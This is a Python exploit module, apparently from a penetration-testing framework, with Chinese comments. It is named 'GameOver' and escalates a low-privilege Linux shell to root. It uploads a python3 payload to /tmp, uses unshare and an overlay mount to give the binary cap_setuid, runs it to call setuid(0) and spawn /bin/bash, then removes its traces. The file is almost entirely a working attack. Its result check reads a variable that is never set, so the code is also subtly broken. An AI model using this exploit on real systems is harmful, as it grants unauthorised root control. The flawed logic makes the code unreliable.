import os
import sys
import subprocess
import threading
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "GameOver"
        self.port = None                # 本地提权，无网络端口
        self.protocol = "local"
        self.platform = "linux"
        self.session = True
        self.use_msf = False
        self.payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "payloads", "python3")

    def exploit(self, target_ip=None, target_port=None, lhost=None, session=None):
        if session is None:
            return False, "需要一个已获取的低权限 shell 会话"

        try:
            session.execute("mkdir -p /tmp/poc/l/ /tmp/poc/u/ /tmp/poc/w/ /tmp/poc/m/")
            session.upload(self.payload_path, "/tmp/poc/l/", recursive=True)
            session.execute("""cd /tmp/poc/ && unshare -rm sh -c "setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'""")
            session.execute("rm -rf /tmp/poc")
        except Exception as e:
            return False, f"执行失败: {e}"

        try:
            if "uid=0" in output:
                return True, "GameOver 提权成功，已获得 Root 权限"
            else:
                return False, f"\n提权执行失败，输出: {output[:200]}"
        except Exception as e:
            return False, f"执行 payload 时出错: {e}"
